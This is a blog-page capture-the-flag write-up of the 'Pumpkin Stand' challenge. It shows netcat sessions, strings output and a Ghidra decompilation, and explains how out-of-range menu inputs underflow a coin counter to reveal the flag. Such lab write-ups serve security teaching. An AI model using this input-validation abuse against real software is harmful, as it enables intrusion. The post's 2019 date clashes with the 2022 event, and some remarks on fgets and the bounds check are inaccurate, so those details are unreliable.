@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title></title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="robots" content="noodp"/>
+
+    <link rel="stylesheet" href="https://cat0nis.github.io/cat0log/style.css">
+    <link rel="stylesheet" href="https://cat0nis.github.io/cat0log/color/green.css">
+
+        <link rel="stylesheet" href="https://cat0nis.github.io/cat0log/color/background_dark.css">
+    
+    <link rel="stylesheet" href="https://cat0nis.github.io/cat0log/font-hack-subset.css">
+
+    </head>
+
+<body class="">
+<div class="container">
+    
+    <header class="header">
+        <div class="header__inner">
+            <div class="header__logo">
+                    
+                <a href="https://cat0nis.github.io/cat0log/" style="text-decoration: none;">
+                    <div class="logo">
+                      
+                            Cat-0
+                        
+                    </div>
+                </a>
+            </div>
+        </div>
+
+        
+        <nav class="menu">
+            <ul class="menu__inner">
+                <li><a href="https://cat0nis.github.io/cat0log//blog">blog</a></li>
+            
+                <li><a href="https://cat0nis.github.io/cat0log//tags">tags</a></li>
+            
+                <li><a href="https://cat0nis.github.io/cat0log//archive">archive</a></li>
+            
+                <li><a href="https://www.github.com/cat0nis" target="_blank" rel="noopener noreferrer">github</a></li>
+            </ul>
+        </nav>
+    
+    
+        
+    </header>
+    
+
+    <div class="content">
+        
+    <div class="post">
+        
+    <h1 class="post-title"><a href="https://cat0nis.github.io/cat0log/blog/pumpkin/">CTF Writeup - Pumpkin Stand</a></h1>
+    <div class="post-meta-inline">
+        
+    <span class="post-date">
+            2019-11-27
+        </span>
+
+    </div>
+
+    
+
+        
+        <div class="post-content">
+            <p>Type: Pwn</p>
+<p>Difficulty: Easy</p>
+<p>CTF: HackTheBoo 2022</p>
+<p>For this challenge, we’re only given a C executable file, <code>pumpkin_stand</code>, not the challenge code itself, as well as a mock flag.txt. To successfully obtain the real flag, we must interact with the docker instance that is running this binary. </p>
+<h3 id="problem-analysis">Problem analysis</h3>
+<p>To start off, this is what is obtained when interacting with the docker via netcat:</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span>┌──(kali㉿lahabrea)-[~/Downloads]
+</span><span>└─$ nc </span><span style="color:#cf6a4c;">161.35.164.157 31424
+</span><span>
+</span><span>                                          ##&amp;                                
+</span><span>                                        (#&amp;&amp;                                 
+</span><span>                                       ##&amp;&amp;                                  
+</span><span>                                 ,*.  #%%&amp;  .*,                              
+</span><span>                      .&amp;@@@@#@@@&amp;@@@@@@@@@@@@&amp;@@&amp;@#@@@@@@(                   
+</span><span>                    /@@@@&amp;@&amp;@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@&amp;@@@@,                
+</span><span>                   @@@@@@@@@@@@@&amp;@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@&amp;@@@@@@&amp;@@@@@@               
+</span><span>                 #&amp;@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;#@@@@@@@@@@@@@@,             
+</span><span>                .@@@@@#@@@@@@@@#&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;#@@@@@@@@@@@@@&amp;             
+</span><span>                &amp;@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@            
+</span><span>                @@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@&amp;@@@@@            
+</span><span>                @@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@            
+</span><span>                @@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@            
+</span><span>                .@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@             
+</span><span>                 (@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@.             
+</span><span>                   @@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@               
+</span><span>                    ,@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@                 
+</span><span>                       @@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@/                   
+</span><span>                                                                             
+</span><span>Current pumpcoins: [</span><span style="color:#cf6a4c;">1337</span><span>]                                                    
+</span><span>                                                                             
+</span><span>Items:                                                                       
+</span><span>                                                                             
+</span><span style="color:#cf6a4c;">1. </span><span style="color:#ffb964;">Shovel  </span><span>(</span><span style="color:#cf6a4c;">1337</span><span> p.</span><span style="color:#ffb964;">c</span><span>.)                                                       
+</span><span style="color:#cf6a4c;">2. </span><span style="color:#ffb964;">Laser   </span><span>(</span><span style="color:#cf6a4c;">9999</span><span> p.</span><span style="color:#ffb964;">c</span><span>.)                                                       
+</span><span>                                                                             
+</span><span>&gt;&gt;
+</span></code></pre>
+<p>The supposedly ‘correct’ interaction with this program would be this:</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span>&gt;&gt; </span><span style="color:#cf6a4c;">1                                                                              
+</span><span>                                                                                  
+</span><span>How many do you want?                                                             
+</span><span>                                                                                  
+</span><span>&gt;&gt; </span><span style="color:#cf6a4c;">1                                                                              
+</span><span>                                                                                  
+</span><span>Current pumpcoins: [</span><span style="color:#cf6a4c;">0</span><span>]                                                            
+</span><span>                                                                                  
+</span><span>                                                                                  
+</span><span>Good luck crafting this huge pumpkin with a shovel!                               
+</span><span>                                                                                  
+</span><span>                                                                                  
+</span><span>Current pumpcoins: [</span><span style="color:#cf6a4c;">0</span><span>]                                                            
+</span><span>                                                                                  
+</span><span>Items:                                                                            
+</span><span>                                                                                  
+</span><span style="color:#cf6a4c;">1. </span><span style="color:#ffb964;">Shovel  </span><span>(</span><span style="color:#cf6a4c;">1337</span><span> p.</span><span style="color:#ffb964;">c</span><span>.)                                                            
+</span><span style="color:#cf6a4c;">2. </span><span style="color:#ffb964;">Laser   </span><span>(</span><span style="color:#cf6a4c;">9999</span><span> p.</span><span style="color:#ffb964;">c</span><span>.)                                                            
+</span><span>                                                                                  
+</span><span>&gt;&gt; 
+</span></code></pre>
+<p>As we can see, the value for pumpcoins is subtracted from, depending on the price of the item selected.</p>
+<p>If we attempted to buy the second item, which we shouldn’t be able to do, we get this message:</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span>&gt;&gt; </span><span style="color:#cf6a4c;">2                                                                              
+</span><span>                                                                                  
+</span><span>How many do you want?                                                             
+</span><span>                                                                                  
+</span><span>&gt;&gt; </span><span style="color:#cf6a4c;">1                                                                              
+</span><span>                                                                                  
+</span><span>[-] Not enough pumpcoins </span><span style="color:#8fbfdc;">for</span><span> this!                                                
+</span><span>                                                                                  
+</span><span>                                                                                  
+</span><span>Current pumpcoins: [</span><span style="color:#cf6a4c;">0</span><span>]
+</span></code></pre>
+<p>However, we can see something still happens to our current pumpcoin value, which shows this isn’t a very resilient program. In fact, it allows us to spend more coins than what we currently own, as it seems to only verify if we have more coins than the price of a single unit of what we’re attempting to purchase.</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span>Current pumpcoins: [</span><span style="color:#cf6a4c;">1337</span><span>]                                                         
+</span><span>                                                                                  
+</span><span>Items:                                                                            
+</span><span>                                                                                  
+</span><span style="color:#cf6a4c;">1. </span><span style="color:#ffb964;">Shovel  </span><span>(</span><span style="color:#cf6a4c;">1337</span><span> p.</span><span style="color:#ffb964;">c</span><span>.)                                                            
+</span><span style="color:#cf6a4c;">2. </span><span style="color:#ffb964;">Laser   </span><span>(</span><span style="color:#cf6a4c;">9999</span><span> p.</span><span style="color:#ffb964;">c</span><span>.)                                                            
+</span><span>                                                                                  
+</span><span>&gt;&gt; </span><span style="color:#cf6a4c;">1                                                                              
+</span><span>                                                                                  
+</span><span>How many do you want?                                                             
+</span><span>                                                                                  
+</span><span>&gt;&gt; </span><span style="color:#cf6a4c;">10                                                                             
+</span><span>                                                                                  
+</span><span>Current pumpcoins: [-</span><span style="color:#cf6a4c;">12033</span><span>]                                                       
+</span><span>                                                                                  
+</span><span>                                                                                  
+</span><span>[-] Not enough pumpcoins </span><span style="color:#8fbfdc;">for</span><span> this!
+</span></code></pre>
+<p>This doesn’t help much in obtaining the flag but we can see that this piece of software is quite faulty.</p>
+<p>At this point, it was worth taking a look at the binary file itself, to search for any obvious clues to solve this challenge.</p>
+<h3 id="strings">Strings</h3>
+<p>A quick look at the output of the ‘string’ tool (Truncated to just the interesting parts - Full file can be viewed at the end of this writeup)</p>
+<p>Here we have some function headers:</p>
+<pre data-lang="jsx" style="background-color:#151515;color:#e8e8d3;" class="language-jsx "><code class="language-jsx" data-lang="jsx"><span>└─$ strings pumpkin_stand 
+</span><span>./glibc/ld-linux-x86-64.so.2
+</span><span>libc.so.6
+</span><span>exit
+</span><span>fopen
+</span><span>__isoc99_scanf
+</span><span>puts
+</span><span>__stack_chk_fail
+</span><span>stdin
+</span><span>printf
+</span><span>fgets
+</span><span>stdout
+</span><span>alarm
+</span></code></pre>
+<p>The presence of <code>fgets</code> here are big red flags pointing to being possible to cause an overflow somewhere in the program execution, since it often doesn’t have a boundary check on where to write to.</p>
+<p>And here we have the strings that are the text that is printed to the terminal:</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span>Current pumpcoins: [%s%d%s]
+</span><span>Items: 
+</span><span style="color:#cf6a4c;">1. </span><span style="color:#ffb964;">Shovel  </span><span>(</span><span style="color:#cf6a4c;">1337</span><span> p.</span><span style="color:#ffb964;">c</span><span>.)
+</span><span style="color:#cf6a4c;">2. </span><span style="color:#ffb964;">Laser   </span><span>(</span><span style="color:#cf6a4c;">9999</span><span> p.</span><span style="color:#ffb964;">c</span><span>.)
+</span><span>[</span><span style="color:#cf6a4c;">1</span><span>;</span><span style="color:#cf6a4c;">32m
+</span><span>                                          ##&amp;
+</span><span>                                        (#&amp;&amp;
+</span><span>                                       ##&amp;&amp;
+</span><span>                                 ,*.  #%%%&amp;  .*,
+</span><span>%s                      .&amp;@@@@#@@@&amp;@@@@@@@@@@@@&amp;@@&amp;@#@@@@@@(
+</span><span>                    /@@@@&amp;@&amp;@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@&amp;@@@@,
+</span><span>                   @@@@@@@@@@@@@&amp;@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@&amp;@@@@@@&amp;@@@@@@
+</span><span>                 #&amp;@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;#@@@@@@@@@@@@@@,
+</span><span>                .@@@@@#@@@@@@@@#&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;#@@@@@@@@@@@@@&amp;
+</span><span>                &amp;@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@
+</span><span>                @@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@&amp;@@@@@
+</span><span>                @@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@
+</span><span>                .@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@
+</span><span>                 (@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@.
+</span><span>                   @@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@
+</span><span>                    ,@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@
+</span><span>                       @@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@/
+</span><span>How many </span><span style="color:#8fbfdc;">do</span><span> you want?
+</span><span>[</span><span style="color:#cf6a4c;">1</span><span>;</span><span style="color:#cf6a4c;">31m
+</span><span>[-] You cannot buy less than </span><span style="color:#cf6a4c;">1</span><span>!
+</span><span>[-] Not enough pumpcoins </span><span style="color:#8fbfdc;">for</span><span> this!
+</span><span>Good luck crafting this huge pumpkin with a shovel!
+</span><span>./flag.</span><span style="color:#ffb964;">txt
+</span><span>Error opening flag.</span><span style="color:#ffb964;">txt</span><span>, please contact an Administrator!
+</span><span>Congratulations, here is the code to get your laser:
+</span><span>;*</span><span style="color:#cf6a4c;">3</span><span>$</span><span style="color:#556633;">&quot;
+</span><span style="color:#99ad6a;">GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
+</span></code></pre>
+<p>As we can see, the program itself seems to read flag.txt and give us the flag. Now, how to trigger this?</p>
+<h3 id="the-solution">The Solution</h3>
+<p>Due the erratic behaviour of the program previously, more ‘invalid’ inputs were attempted.</p>
+<pre data-lang="jsx" style="background-color:#151515;color:#e8e8d3;" class="language-jsx "><code class="language-jsx" data-lang="jsx"><span>└─$ nc 157.245.42.104 30201
+</span><span>
+</span><span>                                          ##&amp;                                
+</span><span>                                        (#&amp;&amp;                                 
+</span><span>                                       ##&amp;&amp;                                  
+</span><span>                                 ,*.  #%%&amp;  .*,                              
+</span><span>                      .&amp;@@@@#@@@&amp;@@@@@@@@@@@@&amp;@@&amp;@#@@@@@@(                   
+</span><span>                    /@@@@&amp;@&amp;@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@&amp;@@@@,                
+</span><span>                   @@@@@@@@@@@@@&amp;@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@&amp;@@@@@@&amp;@@@@@@               
+</span><span>                 #&amp;@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;#@@@@@@@@@@@@@@,             
+</span><span>                .@@@@@#@@@@@@@@#&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;#@@@@@@@@@@@@@&amp;             
+</span><span>                &amp;@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@            
+</span><span>                @@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@&amp;@@@@@            
+</span><span>                @@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@            
+</span><span>                @@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@            
+</span><span>                .@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@             
+</span><span>                 (@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@.             
+</span><span>                   @@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@               
+</span><span>                    ,@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@                 
+</span><span>                       @@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@/                   
+</span><span>                                                                             
+</span><span>Current pumpcoins: [1337]                                                    
+</span><span>Items:                                                                       
+</span><span>1. Shovel  (1337 p.c.)                                   
+</span><span>2. Laser   (9999 p.c.)   
+</span><span>&gt;&gt; 3                           
+</span><span>How many do you want?        
+</span><span>&gt;&gt; 1                      
+</span><span>[-] Not enough pumpcoins for this!   
+</span></code></pre>
+<p>As we can see, the ‘menu’ doesn’t validate whether the user’s input is valid, allowing us to input an ‘option’ larger than the maximum the program is supposed to handle.
+Trying other inputs, we get a very strange behavior on the pumpcoin counter - Despite the error, it is altered and becomes negative!</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span>Current pumpcoins: [</span><span style="color:#cf6a4c;">1337</span><span>]                                                                                                                                 
+</span><span>Items:                                                                                                                                                    
+</span><span style="color:#cf6a4c;">1. </span><span style="color:#ffb964;">Shovel  </span><span>(</span><span style="color:#cf6a4c;">1337</span><span> p.</span><span style="color:#ffb964;">c</span><span>.)                                                       
+</span><span style="color:#cf6a4c;">2. </span><span style="color:#ffb964;">Laser   </span><span>(</span><span style="color:#cf6a4c;">9999</span><span> p.</span><span style="color:#ffb964;">c</span><span>.)                                                                                                                                    
+</span><span>&gt;&gt; </span><span style="color:#cf6a4c;">4                                                                                                                                                      
+</span><span>How many do you want?                                                                                                                                     
+</span><span>&gt;&gt; </span><span style="color:#cf6a4c;">1                                                                                                                                                      
+</span><span>Current pumpcoins: [-</span><span style="color:#cf6a4c;">4647</span><span>]                                                                                                                                                                                                             
+</span><span>[-] Not enough pumpcoins </span><span style="color:#8fbfdc;">for</span><span> this!                                                                                                                                                                                                     
+</span></code></pre>
+<p>Any further attempt after this yields the flag — The objective of the challenge seems to simply be to get a low enough (or high enough, since these end up being the same due to overflowing) pumpcoin value.</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span>Current pumpcoins: [-</span><span style="color:#cf6a4c;">4647</span><span>]                                                                                                                                
+</span><span>Items:                                                                                                                                                    
+</span><span style="color:#cf6a4c;">1. </span><span style="color:#ffb964;">Shovel  </span><span>(</span><span style="color:#cf6a4c;">1337</span><span> p.</span><span style="color:#ffb964;">c</span><span>.)                                                       
+</span><span style="color:#cf6a4c;">2. </span><span style="color:#ffb964;">Laser   </span><span>(</span><span style="color:#cf6a4c;">9999</span><span> p.</span><span style="color:#ffb964;">c</span><span>.)                                                                                                                                    
+</span><span>&gt;&gt; </span><span style="color:#cf6a4c;">5                                 </span><span style="color:#888888;">// this could also be 4                                                                                                                              
+</span><span>How many do you want?                                                                                                                                     
+</span><span>&gt;&gt; </span><span style="color:#cf6a4c;">1                                                                                                                                                      
+</span><span>Congratulations, here is the code to get your laser:                         
+</span><span>                                                                             
+</span><span>HTB{</span><span style="color:#cf6a4c;">1nt3g3R_0v3rfl0w_101_0r_0v3R_9000</span><span>!}
+</span></code></pre>
+<p>Flag: HTB{1nt3g3R_0v3rfl0w_101_0r_0v3R_9000!}</p>
+<h3 id="what-happened">What happened?</h3>
+<p>To understand what happened, a disassembler was needed to look at what’s going on under the hood. (<a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra</a> is the tool used in the next examples/Screenshots.)</p>
+<p>Here is the code Ghidra reconstructed for the function ‘main’:</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#8fbfdc;">void </span><span style="color:#fad07a;">main</span><span>(</span><span style="color:#8fbfdc;">void</span><span>)
+</span><span>{
+</span><span>  </span><span style="color:#8fbfdc;">long</span><span> in_FS_OFFSET;
+</span><span>  </span><span style="color:#8fbfdc;">short</span><span> local_54;
+</span><span>  </span><span style="color:#8fbfdc;">short</span><span> local_52;
+</span><span>  FILE *local_50;
+</span><span>  undefined8 local_48;
+</span><span>  undefined8 local_40;
+</span><span>  undefined8 local_38;
+</span><span>  undefined8 local_30;
+</span><span>  undefined8 local_28;
+</span><span>  undefined8 local_20;
+</span><span>  undefined8 local_10;
+</span><span>  
+</span><span>  local_10 = *(undefined8 *)(in_FS_OFFSET + </span><span style="color:#cf6a4c;">0x28</span><span>);
+</span><span>  </span><span style="color:#ffb964;">setup</span><span>();
+</span><span>  </span><span style="color:#ffb964;">banner</span><span>();
+</span><span>  local_54 = </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>  local_52 = </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>  </span><span style="color:#8fbfdc;">while</span><span>( true ) {
+</span><span>    </span><span style="color:#8fbfdc;">while</span><span>( true ) {
+</span><span>      </span><span style="color:#8fbfdc;">while</span><span>( true ) {
+</span><span>        </span><span style="color:#8fbfdc;">while</span><span>( true ) {
+</span><span>          </span><span style="color:#ffb964;">menu</span><span>();
+</span><span>          </span><span style="color:#ffb964;">__isoc99_scanf</span><span>(&amp;DAT_0010132b,&amp;local_54);
+</span><span>          printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">\nHow many do you want?\n\n&gt;&gt; </span><span style="color:#556633;">&quot;</span><span>);
+</span><span>          </span><span style="color:#ffb964;">__isoc99_scanf</span><span>(&amp;DAT_0010132b,&amp;local_52);
+</span><span>          </span><span style="color:#8fbfdc;">if </span><span>(</span><span style="color:#cf6a4c;">0 </span><span>&lt; local_52) </span><span style="color:#8fbfdc;">break</span><span>;
+</span><span>          printf(</span><span style="color:#556633;">&quot;</span><span style="color:#7697d6;">%s</span><span style="color:#99ad6a;">\n[-] You cannot buy less than 1!\n</span><span style="color:#556633;">&quot;</span><span>,&amp;DAT_0010134a);
+</span><span>        }
+</span><span>        **pumpcoins** = **pumpcoins** -
+</span><span>                    local_52 * (</span><span style="color:#8fbfdc;">short</span><span>)*(undefined4 *)((</span><span style="color:#8fbfdc;">long</span><span>)&amp;values + (</span><span style="color:#8fbfdc;">long</span><span>)(</span><span style="color:#8fbfdc;">int</span><span>)local_54 * </span><span style="color:#cf6a4c;">4</span><span>);
+</span><span>        </span><span style="color:#8fbfdc;">if </span><span>(-</span><span style="color:#cf6a4c;">1 </span><span>&lt; **pumpcoins**) </span><span style="color:#8fbfdc;">break</span><span>;
+</span><span>        printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">\nCurrent pumpcoins: [</span><span style="color:#7697d6;">%s%d%s</span><span style="color:#99ad6a;">]\n\n</span><span style="color:#556633;">&quot;</span><span>,&amp;DAT_00100e80,(ulong)(uint)(</span><span style="color:#8fbfdc;">int</span><span>)**pumpcoins**);
+</span><span>        printf(</span><span style="color:#556633;">&quot;</span><span style="color:#7697d6;">%s</span><span style="color:#99ad6a;">\n[-] Not enough pumpcoins for this!\n\n</span><span style="color:#7697d6;">%s</span><span style="color:#556633;">&quot;</span><span>,&amp;DAT_0010134a,&amp;DAT_00100e78);
+</span><span>      }
+</span><span>      </span><span style="color:#8fbfdc;">if </span><span>(local_54 != </span><span style="color:#cf6a4c;">1</span><span>) </span><span style="color:#8fbfdc;">break</span><span>;
+</span><span>      printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">\nCurrent pumpcoins: [</span><span style="color:#7697d6;">%s%d%s</span><span style="color:#99ad6a;">]\n\n</span><span style="color:#556633;">&quot;</span><span>,&amp;DAT_00100e80,(ulong)(uint)(</span><span style="color:#8fbfdc;">int</span><span>)**pumpcoins**);
+</span><span>      puts(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">\nGood luck crafting this huge pumpkin with a shovel!\n</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>    }
+</span><span>    </span><span style="color:#8fbfdc;">if </span><span>(</span><span style="color:#cf6a4c;">0x270e </span><span>&lt; **pumpcoins**) </span><span style="color:#8fbfdc;">break</span><span>;
+</span><span>    printf(</span><span style="color:#556633;">&quot;</span><span style="color:#7697d6;">%s</span><span style="color:#99ad6a;">\n[-] Not enough pumpcoins for this!\n\n</span><span style="color:#7697d6;">%s</span><span style="color:#556633;">&quot;</span><span>,&amp;DAT_0010134a,&amp;DAT_00100e78);
+</span><span>  }
+</span><span>  local_48 = </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>  local_40 = </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>  local_38 = </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>  local_30 = </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>  local_28 = </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>  local_20 = </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>  local_50 = fopen(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">./flag.txt</span><span style="color:#556633;">&quot;</span><span>,</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">rb</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  </span><span style="color:#8fbfdc;">if </span><span>(local_50 != (FILE *)</span><span style="color:#cf6a4c;">0x0</span><span>) {
+</span><span>    fgets((</span><span style="color:#8fbfdc;">char </span><span>*)&amp;local_48,</span><span style="color:#cf6a4c;">0x30</span><span>,local_50);
+</span><span>    printf(</span><span style="color:#556633;">&quot;</span><span style="color:#7697d6;">%s</span><span style="color:#99ad6a;">\nCongratulations, here is the code to get your laser:\n\n</span><span style="color:#7697d6;">%s</span><span style="color:#99ad6a;">\n\n</span><span style="color:#556633;">&quot;</span><span>,&amp;DAT_00100ee3,
+</span><span>           &amp;local_48);
+</span><span>                    </span><span style="color:#888888;">/* WARNING: Subroutine does not return */
+</span><span>    exit(</span><span style="color:#cf6a4c;">0x16</span><span>);
+</span><span>  }
+</span><span>  puts(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Error opening flag.txt, please contact an Administrator!\n</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>                    </span><span style="color:#888888;">/* WARNING: Subroutine does not return */
+</span><span>  exit(</span><span style="color:#cf6a4c;">1</span><span>);
+</span><span>}
+</span></code></pre>
+<p>A closer look at the code above, on the segments that interest us:</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span>          </span><span style="color:#ffb964;">__isoc99_scanf</span><span>(&amp;DAT_0010132b,&amp;local_54);  </span><span style="color:#888888;">// -&gt; Stores the selected item in local_54
+</span><span>          </span><span style="color:#ffb964;">printf</span><span>(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">\nHow many do you want?\n\n&gt;&gt; </span><span style="color:#556633;">&quot;</span><span>);
+</span><span>          </span><span style="color:#ffb964;">__isoc99_scanf</span><span>(&amp;DAT_0010132b,&amp;local_52); </span><span style="color:#888888;">// -&gt; Stores amount of item in local_52
+</span><span>          </span><span style="color:#8fbfdc;">if </span><span>(</span><span style="color:#cf6a4c;">0 </span><span>&lt; local_52) </span><span style="color:#8fbfdc;">break</span><span>; </span><span style="color:#888888;">// Verify the amount to buy &gt; 1
+</span><span>          </span><span style="color:#ffb964;">printf</span><span>(</span><span style="color:#556633;">&quot;</span><span style="color:#7697d6;">%s</span><span style="color:#99ad6a;">\n[-] You cannot buy less than 1!\n</span><span style="color:#556633;">&quot;</span><span>,&amp;DAT_0010134a);
+</span><span>        }
+</span><span>        **pumpcoins** = **pumpcoins** -
+</span><span>                    local_52 * (</span><span style="color:#8fbfdc;">short</span><span>)*(undefined4 *)((</span><span style="color:#8fbfdc;">long</span><span>)&amp;values + (</span><span style="color:#8fbfdc;">long</span><span>)(</span><span style="color:#8fbfdc;">int</span><span>)local_54 * </span><span style="color:#cf6a4c;">4</span><span>); 
+</span></code></pre>
